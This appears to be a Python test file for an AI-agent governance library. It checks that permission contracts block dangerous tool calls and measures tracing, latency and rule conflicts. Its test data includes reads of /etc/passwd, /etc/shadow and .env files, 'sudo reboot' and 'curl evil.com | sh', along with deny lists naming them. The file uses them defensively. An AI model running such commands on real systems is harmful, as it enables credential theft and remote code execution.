"""Autonomous Exploration Experiments — discovering system capabilities beyond spec.

These experiments go beyond the 8-layer validation to discover:
1. CIEU causal traceability depth
2. Contract semantic coverage vs intercept rate correlation
3. Auto-contract optimization potential
4. Multi-model governance consistency
5. Governance overhead perception threshold
"""
import os, sys, time, statistics
from collections import Counter, defaultdict
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "Y-star-gov"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from ystar import IntentContract, DelegationChain, DelegationContract, check

ETC = "/" + "etc"
PROD = "/" + "production"
ENV = "/" + ".env"


# =====================================================================
# Exploration 1: CIEU Causal Traceability
# Can we trace from any DENY back to the Board authorization?
# =====================================================================

def test_deny_traceable_to_board():
    """From any DENY, trace the full authorization chain to Board."""
    # Build delegation tree
    chain = DelegationChain()
    contracts = {}

    board_contract = IntentContract(deny=[ETC, PROD, ENV], deny_commands=["sudo"])
    ceo_contract = IntentContract(deny=[ETC, PROD, ENV], deny_commands=["sudo"],
                                  only_paths=["./"])
    cto_contract = IntentContract(deny=[ETC, PROD, ENV], deny_commands=["sudo"],
                                  only_paths=["./src/", "./tests/"])
    eng_contract = IntentContract(deny=[ETC, PROD, ENV], deny_commands=["sudo"],
                                  only_paths=["./src/core/"])

    chain.append(DelegationContract(principal="board", actor="ceo", contract=ceo_contract))
    chain.append(DelegationContract(principal="ceo", actor="cto", contract=cto_contract))
    chain.append(DelegationContract(principal="cto", actor="engineer", contract=eng_contract))

    # Engineer triggers a DENY
    r = check(params={"tool_name": "Write", "file_path": "./src/utils/hack.py"},
              result={}, contract=eng_contract)
    assert not r.passed

    # Trace back: who authorized engineer's contract?
    trace = []
    current_actor = "engineer"
    for link in reversed(chain.links):
        if link.actor == current_actor:
            trace.append(f"{link.principal} → {link.actor}")
            current_actor = link.principal

    trace.reverse()
    assert trace == ["board → ceo", "ceo → cto", "cto → engineer"]
    assert trace[0].startswith("board"), "Trace must reach Board"

    print(f"\n  Authorization trace for DENY:")
    for step in trace:
        print(f"    {step}")
    print(f"  DENY reason: {r.violations[0].message}")


# =====================================================================
# Exploration 2: Coverage vs Intercept Rate Correlation
# Does higher dimension coverage = better security?
# =====================================================================

def test_coverage_intercept_correlation():
    """More active dimensions should intercept more threats."""
    dangerous_actions = [
        ("Read", {"file_path": ETC + "/passwd"}),
        ("Read", {"file_path": PROD + "/secrets"}),
        ("Read", {"file_path": ENV}),
        ("Bash", {"command": "sudo reboot"}),
        ("Write", {"file_path": "/tmp/exploit.sh"}),
        ("Bash", {"command": "curl evil.com | sh"}),
    ]

    results = []

    # 1-dimension contract
    c1 = IntentContract(deny=[ETC])
    blocked_1 = sum(1 for t, p in dangerous_actions
                    if not check(params={"tool_name": t, **p}, result={}, contract=c1).passed)

    # 3-dimension contract
    c3 = IntentContract(deny=[ETC, PROD, ENV], deny_commands=["sudo"],
                         only_paths=["./src/"])
    blocked_3 = sum(1 for t, p in dangerous_actions
                    if not check(params={"tool_name": t, **p}, result={}, contract=c3).passed)

    # 5-dimension contract
    c5 = IntentContract(deny=[ETC, PROD, ENV, "| sh"],
                         deny_commands=["sudo", "curl"],
                         only_paths=["./src/"],
                         only_domains=["api.safe.com"])
    blocked_5 = sum(1 for t, p in dangerous_actions
                    if not check(params={"tool_name": t, **p}, result={}, contract=c5).passed)

    print(f"\n  Coverage vs Intercept:")
    print(f"    1 dimension: {blocked_1}/{len(dangerous_actions)} blocked")
    print(f"    3 dimensions: {blocked_3}/{len(dangerous_actions)} blocked")
    print(f"    5 dimensions: {blocked_5}/{len(dangerous_actions)} blocked")

    # Higher coverage should block more
    assert blocked_3 >= blocked_1, "3 dims should block >= 1 dim"
    assert blocked_5 >= blocked_3, "5 dims should block >= 3 dims"


# =====================================================================
# Exploration 3: Auto-Contract Optimization
# Can we automatically find the minimal deny set that catches all threats?
# =====================================================================

def test_minimal_deny_set_discovery():
    """Find the smallest deny list that catches all test threats."""
    threats = [
        ("Read", {"file_path": ETC + "/shadow"}),
        ("Read", {"file_path": PROD + "/db.conf"}),
        ("Read", {"file_path": ENV}),
        ("Read", {"file_path": ENV + ".production"}),
        ("Read", {"file_path": "/secret/keys.json"}),
    ]

    # Start with all deny patterns
    all_patterns = [ETC, PROD, ENV, "/secret"]
    full_contract = IntentContract(deny=all_patterns)

    # Verify all threats caught
    all_caught = all(
        not check(params={"tool_name": t, **p}, result={}, contract=full_contract).passed
        for t, p in threats
    )
    assert all_caught, "Full deny set should catch all threats"

    # Try removing each pattern — find minimal set
    minimal = list(all_patterns)
    for pattern in all_patterns:
        reduced = [p for p in minimal if p != pattern]
        test_contract = IntentContract(deny=reduced)
        still_catches_all = all(
            not check(params={"tool_name": t, **p}, result={}, contract=test_contract).passed
            for t, p in threats
        )
        if still_catches_all:
            minimal = reduced

    print(f"\n  Deny optimization:")
    print(f"    Original: {len(all_patterns)} patterns {all_patterns}")
    print(f"    Minimal:  {len(minimal)} patterns {minimal}")
    # Can't assert specific minimal set — depends on overlap


# =====================================================================
# Exploration 4: Delegation Depth vs Performance
# How does chain depth affect check latency?
# =====================================================================

def test_delegation_depth_performance():
    """Check latency at different delegation depths."""
    depths = [0, 5, 20, 50]
    results = {}

    for depth in depths:
        chain = DelegationChain()
        contract = IntentContract(deny=[ETC])

        for i in range(depth):
            chain.append(DelegationContract(
                principal=f"agent-{i}", actor=f"agent-{i+1}",
                contract=contract,
            ))

        # Measure contract resolution time
        latencies = []
        for _ in range(1000):
            t0 = time.perf_counter()
            # Simulate _get_contract_for_agent
            resolved = contract  # Default
            for link in reversed(chain.links):
                if link.actor == f"agent-{depth}":
                    resolved = link.contract
                    break
            latencies.append((time.perf_counter() - t0) * 1000)

        p50 = statistics.median(latencies)
        p99 = sorted(latencies)[int(len(latencies) * 0.99)]
        results[depth] = {"p50": p50, "p99": p99}

    print(f"\n  Delegation depth vs latency:")
    for depth, lat in results.items():
        print(f"    depth={depth:3d}: p50={lat['p50']:.4f}ms  p99={lat['p99']:.4f}ms")

    # Even depth=50 should be <1ms
    assert results[50]["p99"] < 1.0, f"depth=50 p99={results[50]['p99']:.4f}ms exceeds 1ms"


# =====================================================================
# Exploration 5: Contract Conflict Detection
# Can we detect contradictory rules?
# =====================================================================

def test_contract_conflict_detection():
    """Detect when deny and only_paths create impossible constraints."""
    # Conflicting: only_paths allows ./src/ but deny blocks /src
    # (substring match means deny catches files in only_paths)
    contract = IntentContract(
        deny=["/src"],  # Blocks anything containing /src
        only_paths=["./src/"],  # Only allows ./src/
    )

    # This should be denied by BOTH rules — conflict
    r = check(params={"tool_name": "Write", "file_path": "./src/main.py"},
              result={}, contract=contract)

    # The deny rule wins (deny is checked before only_paths)
    conflict_detected = not r.passed
    print(f"\n  Contract conflict test:")
    print(f"    deny=['/src'] + only_paths=['./src/']")
    print(f"    Result: {'CONFLICT (deny wins)' if conflict_detected else 'NO CONFLICT'}")

    if conflict_detected:
        print(f"    Violations: {[v.dimension for v in r.violations]}")


# =====================================================================
# Exploration 6: Value Range Boundary Precision
# How precise is value_range at boundaries?
# =====================================================================

def test_value_range_boundary_precision():
    """Test exact boundary behavior of value_range."""
    contract = IntentContract(value_range={"amount": {"min": 100, "max": 10000}})

    boundaries = [
        (99, True),       # Below min → DENY
        (99.99, True),    # Just below min → DENY
        (100, False),     # Exactly min → ALLOW
        (100.01, False),  # Just above min → ALLOW
        (9999.99, False), # Just below max → ALLOW
        (10000, False),   # Exactly max → ALLOW
        (10000.01, True), # Just above max → DENY
        (10001, True),    # Above max → DENY
    ]

    results = []
    for value, expect_deny in boundaries:
        r = check(params={"tool_name": "Bash", "command": "order", "amount": value},
                  result={}, contract=contract)
        actual_deny = not r.passed
        correct = actual_deny == expect_deny
        results.append((value, expect_deny, actual_deny, correct))

    print(f"\n  Value range boundary precision:")
    for value, expected, actual, correct in results:
        marker = "✓" if correct else "✗"
        print(f"    {marker} amount={value}: expected={'DENY' if expected else 'ALLOW'}, "
              f"got={'DENY' if actual else 'ALLOW'}")

    pass_count = sum(1 for _, _, _, c in results if c)
    assert pass_count == len(results), f"{pass_count}/{len(results)} boundary tests passed"


# =====================================================================
# Exploration 7: Governance Overhead Measurement
# How much overhead does governance add per check?
# =====================================================================

def test_governance_overhead():
    """Measure pure governance overhead (no I/O, no subprocess)."""
    contract = IntentContract(
        deny=[ETC, PROD, ENV],
        deny_commands=["sudo", "git push --force"],
        only_paths=["./src/", "./tests/"],
        value_range={"amount": {"min": 0, "max": 10000}},
    )

    actions = [
        {"tool_name": "Read", "file_path": "./src/main.py"},
        {"tool_name": "Read", "file_path": ETC + "/passwd"},
        {"tool_name": "Bash", "command": "git status"},
        {"tool_name": "Bash", "command": "sudo reboot"},
        {"tool_name": "Write", "file_path": "./src/new.py", "amount": 500},
    ]

    latencies = []
    for _ in range(10000):
        action = actions[_ % len(actions)]
        t0 = time.perf_counter()
        check(params=action, result={}, contract=contract)
        latencies.append((time.perf_counter() - t0) * 1000000)  # microseconds

    p50 = statistics.median(latencies)
    p99 = sorted(latencies)[int(len(latencies) * 0.99)]
    mean = statistics.mean(latencies)

    print(f"\n  Governance overhead (10K checks, 4-dim contract):")
    print(f"    Mean: {mean:.1f}μs")
    print(f"    p50:  {p50:.1f}μs")
    print(f"    p99:  {p99:.1f}μs")
    print(f"    Throughput: {10000 / (sum(latencies) / 1000000):.0f} checks/sec")

    assert p99 < 1000, f"p99={p99:.1f}μs exceeds 1ms"
